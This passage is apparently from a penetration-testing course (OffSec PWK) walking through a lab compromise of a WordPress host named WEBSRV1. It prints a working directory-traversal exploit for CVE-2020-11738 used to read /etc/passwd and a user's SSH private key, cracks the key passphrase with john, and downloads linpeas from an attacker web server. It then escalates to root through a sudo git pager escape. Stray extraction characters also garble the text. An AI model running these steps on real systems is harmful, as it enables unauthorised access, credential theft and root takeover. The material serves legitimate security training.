import sys
if len(sys.argv) != 3:
print("Exploit made by nam3lum.")
print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
exit()
arg = sys.argv[1]
file = sys.argv[2]
URL = arg + "/wp-admin/admin-
ajax.php?action=duplicator_download&file=../../../../../../../../.." + file
output = re.get(url = URL)
print(output.text)
Listing 874 - Information about the Directory Traversal vulnerability in Duplicator 1.3.26
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 816
Made in Morocco
Penetration Testing with Kali Linux
Listing 874 shows the Python code to exploit the vulnerability tracked as CVE-2020-11738.1189
Notice that the Python script sends a GET request to a URL and adds a filename prepended with
“dot dot slash” expressions.
Let’s copy the Python script to the /home/kali/beyond/websrv1 directory using SearchSploit’s -m
option with the ExploitDB ID.
kali@kali:~/beyond$ cd beyond/websrv1
kali@kali:~/beyond/websrv1$ searchsploit -m 50420
Exploit: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
URL: https://www.exploit-db.com/exploits/50420
Path: /usr/share/exploitdb/exploits/php/webapps/50420.py
File Type: ASCII text
Copied to: /home/kali/beyond/websrv1/50420.py y
Listing 875 - SearchSploit command to copy the exploit script to the current directory
k
To use the script, we have to provide the URL of our target and the file we want to retrieve. Let’s
attempt to read and display the contents of /etc/passwd both to confirm that the target is indeed
vulnerable and to obtain user account names of the systsem.
kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /etc/passwd
o
root:x:0:0:root:/root:/bin/bash
...
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
n
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
Listing 876 - Performing a Directory Traversal attack on WEBSRV1
i
Very nice! We successfully obtained the contents of /etc/passwd and identified two user
z
accounts, daniela and marcus. Let’s add them to creds.txt.
As we have learned in the DCommon Web Application Attacks Module, there are several files we
can attempt to retrieve via Directory Traversal in order to obtain access to a system. One of the
most common methods is to retrieve an SSH private key configured with permissions that are too
open.
In this example, we’ll attempt to retrieve an SSH private key with the name id_rsa. The name will
differ depending on the specified type when creating an SSH private key with ssh-keygen.1190 For
example, when choosing ecdsa as the type, the resulting SSH private key is named id_ecdsa by
default.
Let’s check for SSH private keys with the name id_rsa in the home directories of daniela and
marcus.
kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244
/home/marcus/.ssh/id_rsa
Invalid installer file name!!
kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244
/home/daniela/.ssh/id_rsa
1189 (NVD NIST, 2022), https://nvd.nist.gov/vuln/detail/CVE-2020-11738
1190 (Linux Die.Net, 2022), https://linux.die.net/man/1/ssh-keygen
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 817
Made in Morocco
Penetration Testing with Kali Linux
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
3CytILJX83Yd9rAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDwl5IEgynx
KMLz7p6mzgvTquG5/NT749sMGn+sq7VxLuF5zPK9sh//lVSxf6pQYNhrX36FUeCpu/bOHr
tn+4AZJEkpHq8g21ViHu62IfOWXtZZ1g+9uKTgm5MTR4M8bp4QX+T1R7TzTJsJnMhAdhm1
...
UoRUBJIeKEdUlvbjNuXE26AwzrITwrQRlwZP5WY+UwHgM2rx1SFmCHmbcfbD8j9YrYgUAu
vJbdmDQSd7+WQ2RuTDhK2LWCO3YbtOd6p84fKpOfFQeBLmmSKTKSOddcSTpIRSu7RCMvqw
l+pUiIuSNB2JrMzRAirldv6FODOlbtO6P/iwAO4UbNCTkyRkeOAz1DiNLEHfAZrlPbRHpm
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----
Listing 877 - Retrieving the SSH private key of daniela
Listing 877 shows that we have successfully retrieved the SSH private key of daniela. Let’s save
the key in a file named id_rsa in the current directory. y
Next, let’s attempt to leverage this key to access WEBSRV1 as daniela via SSH. To do so, we have
to modify the file permissions as we have done several times ink this course.
kali@kali:~/beyond/websrv1$ chmod 600 id_rsa
s
kali@kali:~/beyond/websrv1$ ssh -i id_rsa PI:EMAIL
Enter passphrase for key 'id_rsa': o
Listing 878 - Trying to leverage the SSH private key to access WEBSRV1
n
Listing 878 shows that the SSH private key is protected by a passphrase. Therefore, let’s attempt
to crack it using ssh2john and john with the rockyou.txt wordlist. After a few moments, the
i
cracking attempt is successful as shown in the following listing.
z
kali@kali:~/beyond/websrv1$ ssh2john id_rsa > ssh.hash
D
kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
...
tequieromucho (id_rsa)
...
Listing 879 - Cracking the passphrase of the SSH private key
Now, let’s attempt to access the system again via SSH by providing the passphrase.
kali@kali:~/beyond/websrv1$ ssh -i id_rsa PI:EMAIL
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64)
...
daniela@websrv1:~$
Listing 880 - Accessing WEBSRV1 via SSH
Success! We gained access to the first target in the penetration test.
Before we head into the next section, where we’ll perform post-exploitation enumeration, let’s add
the cracked passphrase to the creds.txt file in the work environment directory. As users tend to
reuse passwords and passphrases, we may need it again later in this assessment.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 818
Made in Morocco
Penetration Testing with Kali Linux
24.2.2 A Link to the Past
In the previous section, we gained access to the target machine WEBSRV1. In this section, we’ll
perform local enumeration to identify attack vectors and sensitive information and attempt to
elevate our privileges.
Because we often have time constraints in a penetration test, such as the duration of an
assessment, let’s use the linPEAS automated Linux enumeration script to obtain a broad variety
of information and identify any potential low hanging fruit.
To do this, let’s copy linpeas.sh to the websrv1 directory and start a Python3 web server to serve
it.
kali@kali:~/beyond/websrv1$ cp /usr/share/peass/linpeas/linpeas.sh .
y
kali@kali:~/beyond/websrv1$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Listing 881 - Serving the linpeas enumeratikon script
In our SSH session, we can use wget to download the enumeration script. In addition, we’ll use
s
chmod to make the script executable.
daniela@websrv1:~$ wget http://192.168.119.5/olinpeas.sh
--2022-09-30 12:26:55-- http://192.168.119.5/linpeas.sh
Connecting to 192.168.119.5:80... connected.
HTTP request sent, awaiting response...n 200 OK
Length: 826127 (807K) [text/x-sh]
Saving to: ‘linpeas.sh’
i
linpeas.sh 100%[=============z===============>] 806.76K 662KB/s in 1.2s
2022-09-30 12:26:56 (662 KB/s) - ‘linpeas.sh’ saved [826127/826127]
D
daniela@websrv1:~$ chmod a+x ./linpeas.sh
Listing 882 - Downloading linpeas and making it executable
Now, we can run the script and start the enumeration.
daniela@websrv1:~$ ./linpeas.sh
Listing 883 - Starting the local enumeration with linpeas
Once the enumeration script has finished, let’s review some of the results.
We’ll begin with the system information.
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 5.15.0-48-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.2.0-
19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #54-Ubuntu SMP Fri Aug 26
13:26:29 UTC 2022
Distributor ID: Ubuntu
Description: Ubuntu 22.04.1 LTS
Release: 22.04
Codename: jammy
Listing 884 - System information
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 819
Made in Morocco
Penetration Testing with Kali Linux
Listing 884 confirms that the machine is running Ubuntu 22.04 as we’ve identified via the
OpenSSH service version.
Next, we’ll review the network interfaces.
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen
1000
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
inet6 ::1/128 scope host
valid_lft forever preferred_lft forever
2: ens192:  mtu 1500 qdisc fyq_codel state UP group
default qlen 1000
link/ether 00:50:56:8a:26:5d brd ff:ff:ff:ff:ff:ff
k
altname enp11s0
inet 192.168.50.244/24 brd 192.168.50.255 scope global ens192
valid_lft forever preferred_lft forever
s
inet6 fe80::250:56ff:fe8a:265d/64 scope link
valid_lft forever preferred_lft forever
Listing 885 - Netwoork interfaces
Listing 885 shows only one network interface apart from the loopback interface. This means that
the target machine is not connected to the ninternal network and we cannot use it as a pivot point.
Since we have already enumerated MAILSRV1 without any actionable results and this machine is
i
not connected to the internal network, we have to discover sensitive information, such as
z
credentials, to get a foothold in the internal network. To obtain files and data from other users and
the system, we’ll make elevating our privileges our priority.
D
The following result section from linPEAS contains an interesting piece of information regarding
commands executable with sudo.
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for daniela on websrv1:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/b
in, use_pty
User daniela may run the following commands on websrv1:
(ALL) NOPASSWD: /usr/bin/git
Listing 886 - Sudo commands for daniela
Listing 886 shows that daniela can run /usr/bin/git with sudo privileges without entering a
password.
Before we try to leverage this finding into privilege escalation, let’s finish reviewing the linPEAS
results. Otherwise, we may miss some crucial findings.
The next interesting section is Analyzing Wordpress Files, which contains a clear-text password
used for database access.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 820
Made in Morocco
Penetration Testing with Kali Linux
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27 11:31 /srv/www/wordpress/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
Listing 887 - WordPress database connection settings
Discovering a clear-text password is always a potential high value finding. Let’s save the
password in the creds.txt file on our Kali machine for future use.
Another interesting aspect of this finding is the path displayed starts with /srv/www/wordpress/.
The WordPress instance is not installed in /var/www/html where web applications are commonly
found on Debian-based Linux systems. While this is not an actionable result, we should keep it in
mind for future steps.
y
Let’s continue reviewing the linPEAS results. In the Analyzing Github Files section, we’ll find that
the WordPress directory is a Git repository.
k
╔══════════╣ Analyzing Github Files (limit 70)
s
drwxr----- 8 root root 4096 Sep 27 14:26 /srv/www/wordpress/.git
Listing 888 - Git repository in the WordPress directory
o
Based on the output in listing 888, we can assume that Git is used as the version control system
for the WordPress instance. Reviewing the commits of the Git repository may allow us to identify
n
changes in configuration data and sensitive information such as passwords.
The directory is owned by root anid is not readable by other users as shown in Listing 888.
However, we can leverage sudo toz use Git commands in a privileged context and therefore search
the repository for sensitive information.
For now, let’s skip the rest Dof the linPEAS output and summarize what information and potential
privilege escalation vectors we’ve gathered so far.
WEBSRV1 runs Ubuntu 22.04 and is not connected to the internal network. The sudoers file
contains an entry allowing daniela to run /usr/bin/git with elevated privileges without providing a
password. In addition, we learned that the WordPress directory is a Git repository. Finally, we
obtained a clear-text password in the database connection settings for WordPress.
Based on this information we can define three potential privilege escalation vectors:
• Abuse sudo command /usr/bin/git
• Use sudo to search the Git repository
• Attempt to access other users with the WordPress database password
The most promising vector at the moment is to abuse the sudo command /usr/bin/git because
we don’t have to enter a password. Most commands that run with sudo can be abused to obtain
an interactive shell with elevated privileges.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 821
Made in Morocco
Penetration Testing with Kali Linux
To find potential abuses when a binary such as git is allowed to run with sudo, we can consult
GTFOBins.1191 On this page, we enter git in the search bar and select it in the list.1192 Then, let’s
scroll down until we reach the Sudo section:
y
k
Figure 292: Sudo abuse vector for git
s
Figure 292 shows two of the five potential abuse vectors to elevate privileges via git with sudo
privileges. Let’s try the first one by setting an environment variable that executes when launching
o
the help menu.
daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
n
sudo: sorry, you are not allowed to set the following environment variables: PAGER
Listing 889 - Abusing git sudo command by setting an environment variable
i
Unfortunately, the output states that we are not allowed to set an environment variable.
z
Next, let’s try the second abuse vector. This command opens the help menu in the default
pager.1193 On Linux, one of tDhe most popular pagers is less. The commands to navigate the pager
are similar to vi and can be used to execute code in the context of the user account that launched
the pager.
daniela@websrv1:~$ sudo git -p help config
Listing 890 - Abusing git sudo command by launching pager in a privileged context
To execute code through the pager, we can enter ! followed by a command or path to an
executable file. As Figure 292 shows, we can enter a path to a shell. Let’s use /bin/bash to obtain
an interactive shell.
...
• no section or name was provided (ret=2),
• the config file is invalid (ret=3),
!/bin/bash
1191 (GTFOBins, 2022), https://gtfobins.github.io/
1192 (GTFOBins Git, 2022), https://gtfobins.github.io/gtfobins/git
1193 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Terminal_pager
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 822
Made in Morocco
Penetration Testing with Kali Linux
root@websrv1:/home/daniela# whoami
root
Listing 891 - Executing commands via the pager to obtain an interactive shell
Nice! We successfully elevated our privileges on WEBSRV1.
Armed with root privileges, we’ll continue enumerating the system. Before doing so, let’s search